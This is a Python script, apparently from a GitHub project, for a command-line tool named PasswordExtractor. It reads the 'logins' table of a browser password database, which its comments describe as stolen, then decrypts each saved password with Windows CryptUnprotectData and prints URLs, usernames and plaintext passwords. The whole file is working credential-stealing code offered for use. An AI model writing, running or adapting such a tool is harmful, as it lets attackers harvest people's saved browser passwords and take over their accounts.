##############################################
##
## PasswordExtractor version 1.0
## Author: atlantis
## GitHub: https://github.com/atlanntiss
## This tool can help you to quickly extract
## values with logins and passwords from an
## sqlite3 database.
##
##############################################

## Standard modules.
import sqlite3

## Third-party modules.
import click
from win32crypt import CryptUnprotectData

## CLI settings.

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

# We have to input one argument called "database". It is the
# path to a stolen database.
@click.command(context_settings=CONTEXT_SETTINGS)
@click.argument("database", type=click.Path(exists=True))
def main(database):
    """
    PasswordExtractor version 1.0

    Author: atlantis

    GitHub: https://github.com/atlanntiss

    This tool can help you to quickly extract logins
    and passwords values from an sqlite3 database.
    """

    try:
        print(f"Database:\t{database}")
        # When a user typed the path to a database, we
        # use it as an argument of the main function and
        # connect to it.
        connection = sqlite3.connect(database)
        cursor = connection.cursor()

        # This is a simple SQL-query. It takes the columns
        # called origin_url, username_value and password_value
        # from the table called logins. The most password
        # databases of browsers have the same names of
        # the columns and table as I wrote. We execute
        # the query and get all the values that we need.
        sql_query = "SELECT origin_url, username_value, password_value FROM logins"
        print(f"SQL query:\t{sql_query}.")
        print("Getting values...")
        sql_query = cursor.execute(sql_query)
        values = sql_query.fetchall()

        # Just a delimiter.
        print("=" * 32)

        # Printing gotten values.
        for counter, value in enumerate(values):
            print(f"Value #{counter}.")

            origin_url = value[0]
            username = value[1]
            # Decrypting a password value.
            password = CryptUnprotectData(value[2], None, None, None, 0)[1].decode("utf-8")

            print(f"Origin URL:\t{origin_url}")
            print(f"Username value:\t{username}")
            print(f"Password value:\t{password}")

            print("=" * 32)

    except Exception as error:
        # if we have any unexpected errors, we return the
        # error message.
        print(f"Error:\t{error}")

if __name__ == "__main__":
    # If the app file was launched as the main file, the
    # main function will be started.
    main()
